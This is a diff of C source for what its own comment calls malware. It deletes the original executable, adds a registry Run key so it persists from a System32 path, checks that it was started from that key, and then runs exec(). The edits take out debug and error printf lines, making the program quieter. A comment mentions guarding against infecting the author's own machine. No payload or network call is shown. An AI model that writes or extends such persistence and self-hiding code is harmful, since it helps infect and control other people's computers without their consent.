@@ -136,7 +136,6 @@ static void firstRunFromSys32(char** argv) {
 
     // delete the orignal malware file!
     WINBOOL retb = DeleteFileA(delPath);
-    printf("Deleting %s %d...\n\n", delPath, retb);
     
     // check for 64 bit machine, add the KEY_WOW64_64KEY flag if we are in one
     LONG regAccess = KEY_WRITE;
@@ -145,10 +144,7 @@ static void firstRunFromSys32(char** argv) {
     }
 
     RET_CODE ret = generateRegKey(SYS32_PATH, RUN_FROM_REGISTRY, regAccess);
-    if (ret != R_SUCCESS) {
-        printf("Failed to generate registry key.\n");
-        return;
-    }
+    if (ret != R_SUCCESS) { return; }
 
     exec();
 }
@@ -163,7 +159,6 @@ static void runFromRegistry(char** argv) {
     char* path = argv[0];
     char* arg = argv[1];
     if (strcmp(path, SYS32_PATH) != 0 || strcmp(arg, RUN_FROM_REGISTRY) != 0) {
-        printf("Failed to run from reg!");
         return;
     }
 
@@ -225,5 +220,3 @@ void check() {   // just ensuring if I accidently run it then it doesn't infect 
 //         :                         // no inputs
 //         :                         // no clobbers besides the implicit stack change
 //     );
-
-//     printf("Secret string is: %s\n", secret);
